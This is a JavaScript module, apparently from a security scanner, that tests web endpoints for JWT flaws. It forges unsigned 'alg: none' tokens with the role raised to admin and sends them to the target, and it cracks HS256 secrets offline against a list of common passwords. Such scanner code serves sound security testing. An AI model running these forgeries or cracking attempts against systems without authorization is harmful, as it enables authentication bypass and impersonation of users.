import axios from 'axios';
import crypto from 'crypto';
import jwt from 'jsonwebtoken';
import { logger } from '../utils/logger.js';

function buildFinding(endpoint, point, payload, title, category, severity, cvss, confidence, evidence) {
    return {
        assetId: endpoint.assetId,
        endpointId: endpoint.id,
        title,
        description: `Detected ${title} affecting ${point.name}.`,
        category,
        severity,
        cvss,
        detectedBy: 'jwt-analyzer',
        confidence,
        evidence
    };
}

const COMMON_SECRETS = [
    'secret', '123456', 'password', 'admin', 'test', 'jwtsecret',
    'secretkey', 'supersecret', 'changeme', 'token_secret'
]; // In production, load top 10000 from file

export async function testJWT(endpoint, options = {}) {
    const findings = [];
    const timeout = options.timeout || 10000;
    
    // Extract JWTs from headers and URL
    const tokens = extractJWTs(endpoint);
    if (tokens.length === 0) return findings;

    logger.info(`[JWT Test] Found ${tokens.length} JWTs on ${endpoint.url}`);

    for (const { token, source } of tokens) {
        // 1. Test None Algorithm
        const noneFinding = await testNoneAlgorithm(endpoint, token, source, timeout, options);
        if (noneFinding) findings.push(noneFinding);

        // 2. Test Weak Secret Brute Force (Offline)
        const weakFinding = await testWeakSecret(endpoint, token, source);
        if (weakFinding) findings.push(weakFinding);

        // 3. Test Signature Confusion (RS256 -> HS256) (Only if public key is known/extractable, skipping for now unless aggressive)
    }

    return findings;
}

function extractJWTs(endpoint) {
    const tokens = [];
    const jwtRegex = /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$/;
    
    // Check Authorization header
    if (endpoint.headers && endpoint.headers['Authorization']) {
        const auth = endpoint.headers['Authorization'];
        if (auth.startsWith('Bearer ')) {
            const token = auth.split(' ')[1];
            if (jwtRegex.test(token)) tokens.push({ token, source: 'Authorization Header' });
        }
    }
    
    // Check Cookies
    if (endpoint.headers && endpoint.headers['Cookie']) {
        const cookies = endpoint.headers['Cookie'].split(';');
        for (const cookie of cookies) {
            const val = cookie.split('=')[1]?.trim();
            if (val && jwtRegex.test(val)) tokens.push({ token: val, source: 'Cookie' });
        }
    }
    
    return tokens;
}

function parseJWT(token) {
    try {
        const parts = token.split('.');
        const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
        const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
        const signature = parts[2];
        return { header, payload, signature };
    } catch {
        return null;
    }
}

async function testNoneAlgorithm(endpoint, originalToken, source, timeout, options) {
    const parsed = parseJWT(originalToken);
    if (!parsed) return null;

    // Create a modified token with "alg": "none" and stripped signature
    const newHeader = Buffer.from(JSON.stringify({ ...parsed.header, alg: 'none' })).toString('base64url');
    // Also try elevating privileges
    const newPayloadData = { ...parsed.payload };
    if (newPayloadData.role) newPayloadData.role = 'admin';
    if (newPayloadData.admin !== undefined) newPayloadData.admin = true;
    
    const newPayload = Buffer.from(JSON.stringify(newPayloadData)).toString('base64url');
    const forgedToken = `${newHeader}.${newPayload}.`;

    try {
        const headers = { ...endpoint.headers };
        if (source === 'Authorization Header') {
            headers['Authorization'] = `Bearer ${forgedToken}`;
        } else if (source === 'Cookie') {
            // Very naive cookie replace for testing
            headers['Cookie'] = headers['Cookie'].replace(originalToken, forgedToken);
        }

        const resp = await axios.get(endpoint.url, { headers, timeout, validateStatus: () => true });
        
        // If the server accepts the 'none' token (usually 200 OK or 201)
        if (resp.status >= 200 && resp.status < 300) {
            return buildFinding(endpoint, { type: 'header', name: source }, forgedToken, 'JWT None Algorithm Bypass', 'Authentication', 'CRITICAL', 9.8, 100, [
                { type: 'REQUEST', title: 'Forged Token Sent', content: `Source: ${source}\nOriginal: ${originalToken}\nForged (alg: none): ${forgedToken}` },
                { type: 'RESPONSE', title: 'Token Accepted', content: `Status: ${resp.status}\nThe application accepted a JWT with the 'none' algorithm and no signature, allowing arbitrary payload manipulation.` }
            ]);
        }
    } catch (e) {
        logger.error(`[JWT] None alg test failed: ${e.message}`);
    }
    
    return null;
}

async function testWeakSecret(endpoint, token, source) {
    const parsed = parseJWT(token);
    if (!parsed || parsed.header.alg !== 'HS256') return null;

    logger.info(`[JWT] Attempting offline brute force against HS256 token...`);

    // Offline brute force
    for (const secret of COMMON_SECRETS) {
        try {
            jwt.verify(token, secret);
            // If verify succeeds without throwing, we found the secret!
            return buildFinding(endpoint, { type: 'header', name: source }, token, 'Weak JWT Secret', 'Cryptography', 'CRITICAL', 9.8, 100, [
                { type: 'LOG', title: 'Secret Cracked', content: `The JWT secret key was cracked offline.\nSecret: "${secret}"` },
                { type: 'LOG', title: 'Impact', content: `An attacker can use this secret to forge completely valid, cryptographically signed tokens to impersonate any user or escalate privileges.` }
            ]);
        } catch (err) {
            // Verify failed (invalid signature), continue brute force
        }
    }
    
    return null;
}
